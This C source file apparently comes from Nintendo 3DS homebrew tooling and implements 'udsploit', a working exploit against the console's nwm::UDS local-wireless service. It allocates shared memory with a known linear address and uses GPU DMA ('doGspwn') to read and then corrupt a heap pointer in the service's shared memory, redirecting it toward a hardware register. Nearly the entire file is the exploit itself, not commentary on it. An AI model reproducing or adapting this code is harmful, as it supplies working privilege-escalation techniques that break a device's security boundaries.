#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include <ctr/APT.h>
#include <ctr/FS.h>
#include <ctr/GSP.h>

#include "../../build/constants.h"

static Result UDS_InitializeWithVersion(Handle* handle, Handle sharedmem_handle, u32 sharedmem_size)
{
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x001B0302;
	cmdbuf[1] = sharedmem_size;
	memset(&cmdbuf[2], 0x00, 0x28);
	cmdbuf[12] = 0x400;//version
	cmdbuf[13] = 0;
	cmdbuf[14] = sharedmem_handle;

	Result ret = 0;
	if((ret = svc_sendSyncRequest(*handle)))return ret;
	ret = cmdbuf[1];

	return ret;
}

static Result UDS_Bind(Handle* handle, u32 BindNodeID, u32 input0, u8 data_channel, u16 NetworkNodeID)
{
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x120100;
	cmdbuf[1] = BindNodeID;
	cmdbuf[2] = input0;
	cmdbuf[3] = data_channel;
	cmdbuf[4] = NetworkNodeID;

	Result ret=0;
	if((ret = svc_sendSyncRequest(*handle)))return ret;
	ret = cmdbuf[1];

	return ret;
}

static Result UDS_Unbind(Handle* handle, u32 BindNodeID)
{
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x130040;
	cmdbuf[1] = BindNodeID;

	Result ret = 0;
	if((ret = svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

static Result UDS_Shutdown(Handle* handle)
{
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x30000;

	Result ret = 0;
	if((ret = svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result NDM_EnterExclusiveState(Handle* handle, u32 state)
{
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x10042;
	cmdbuf[1] = state;
	cmdbuf[2] = 0x20;

	Result ret = 0;
	if((ret = svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result NDM_LeaveExclusiveState(Handle* handle)
{
	u32* cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x20002;
	cmdbuf[1] = 0x20;

	Result ret = 0;
	if((ret = svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _linearAlloc(u32* linear_addr, u32 size)
{
	return svc_controlMemory(linear_addr, 0, 0, size, 0x10003, 0x3);
}

Result _linearFree(u32 addr, u32 size)
{
	return svc_controlMemory((u32*)&addr, (u32)addr, 0, size, 1, 0);
}

// la == linear address (output)
Result allocHeapWithLa(u32 va, u32 size, u32* la)
{
	Result ret = 0;
	u32 placeholder_addr = 0;
	u32 placeholder_size = 0;
	u32 linear_addr = 0;
	MemInfo minfo = {0};
	PageInfo pinfo = {0};

	// allocate linear buffer as big as target buffer
	// printf("allocate linear buffer as big as target buffer\n");
	ret = _linearAlloc(&linear_addr, size);
	if(ret) return ret;

	// figure out how much memory is available
	// printf("figure out how much memory is available\n");
	s64 tmp = 0;
	ret = svc_getSystemInfo(&tmp, 0, 1);
	if(ret) return ret;
	placeholder_size = FIRM_APPMEMALLOC - (u32)tmp;
	// printf("%08X\n", placeholder_size);

	// figure out va for placeholder
	placeholder_addr = 0x08000000;
	ret = svc_queryMemory(&minfo, &pinfo, 0x08000000);
	if(ret) return ret;
	placeholder_addr += minfo.size;

	// allocate placeholder to cover all free memory
	// printf("allocate placeholder to cover all free memory\n");
	ret = svc_controlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 3, 3);
	if(ret) return ret;

	// free linear block
	// printf("free linear block\n");
	ret = _linearFree(linear_addr, size);
	if(ret) return ret;

	// allocate regular heap to replace it: we know its PA
	// printf("allocate regular heap to replace it\n");
	ret = svc_controlMemory((u32*)&va, (u32)va, 0, size, 3, 3);
	if(ret) return ret;

	// free placeholder memory
	// printf("free placeholder memory\n");
	ret = svc_controlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 1, 0);
	if(ret) return ret;

	if(la) *la = linear_addr;

	return 0;
}

Result _initSrv(Handle* srvHandle);
Result _srv_getServiceHandle(Handle* handleptr, Handle* out, char* server);
void doGspwn(u32* src, u32* dst, u32 size);
Result GSP_FlushDCache(u32* addr, u32 size);

Result udsploit()
{
	Handle udsHandle = 0;
	Handle ndmHandle = 0;
	Handle srvHandle = 0;
	Result ret = 0;

	const u32 sharedmem_size = 0x1000;
	Handle sharedmem_handle = 0;
	u32 sharedmem_va = 0x0dead000, sharedmem_la = 0;
	
	ret = _initSrv(&srvHandle);
	if(ret) return ret;

	// printf("udsploit: srvGetServiceHandle\n");
	ret = _srv_getServiceHandle(&srvHandle, &udsHandle, "nwm::UDS");
	if(ret) goto fail;

	// printf("udsploit: srvGetServiceHandle\n");
	ret = _srv_getServiceHandle(&srvHandle, &ndmHandle, "ndm:u");
	if(ret) goto fail;

	{
		// printf("udsploit: allocHeapWithPa\n");
		ret = allocHeapWithLa(sharedmem_va, sharedmem_size, &sharedmem_la);
		if(ret)
		{
			sharedmem_va = 0;
			goto fail;
		}

		// printf("udsploit: sharedmem_la %08X\n", sharedmem_la);

		// printf("udsploit: svcCreateMemoryBlock\n");
		memset((void*)sharedmem_va, 0, sharedmem_size);
		ret = svc_createMemoryBlock(&sharedmem_handle, (u32)sharedmem_va, sharedmem_size, 0x0, 3);
		if(ret) goto fail;
	}

	// printf("udsploit: NDM_EnterExclusiveState\n");
	ret = NDM_EnterExclusiveState(&ndmHandle, 2); // EXCLUSIVE_STATE_LOCAL_COMMUNICATIONS
	if(ret) goto fail;

	// printf("udsploit: UDS_InitializeWithVersion\n");
	ret = UDS_InitializeWithVersion(&udsHandle, sharedmem_handle, sharedmem_size);
	if(ret) goto fail;

	// printf("udsploit: NDM_LeaveExclusiveState\n");
	ret = NDM_LeaveExclusiveState(&ndmHandle);
	if(ret) goto fail;

	// printf("udsploit: UDS_Bind\n");
	u32 BindNodeID = 1;
	ret = UDS_Bind(&udsHandle, BindNodeID, 0x600, 1, 0);
	if(ret) goto fail;

	{
		u32* buffer = NULL;
		_linearAlloc((u32*)&buffer, sharedmem_size);

		GSP_FlushDCache(buffer, sharedmem_size);

		svc_sleepThread(1 * 1000 * 1000);
		doGspwn((u32*)sharedmem_la, buffer, sharedmem_size);
		svc_sleepThread(1 * 1000 * 1000);

		// int i;
		// for(i = 0; i < 8; i++) printf("%08X %08X %08X %08X\n", buffer[i * 4 + 0], buffer[i * 4 + 1], buffer[i * 4 + 2], buffer[i * 4 + 3]);
					
		buffer[3] = 0x1EC40140 - 8;

		GSP_FlushDCache(buffer, sharedmem_size);
		doGspwn(buffer, (u32*)sharedmem_la, sharedmem_size);
		svc_sleepThread(1 * 1000 * 1000);

		_linearFree((u32)buffer, sharedmem_size);
	}

	// printf("udsploit: UDS_Unbind\n");
	ret = UDS_Unbind(&udsHandle, BindNodeID);
	if(ret) goto fail;

	fail:
	if(udsHandle) UDS_Shutdown(&udsHandle);
	if(ndmHandle) svc_closeHandle(ndmHandle);
	if(udsHandle) svc_closeHandle(udsHandle);
	if(sharedmem_handle) svc_closeHandle(sharedmem_handle);
	if(sharedmem_va) svc_controlMemory((u32*)&sharedmem_va, (u32)sharedmem_va, 0, sharedmem_size, 0x1, 0);
	return ret;
}
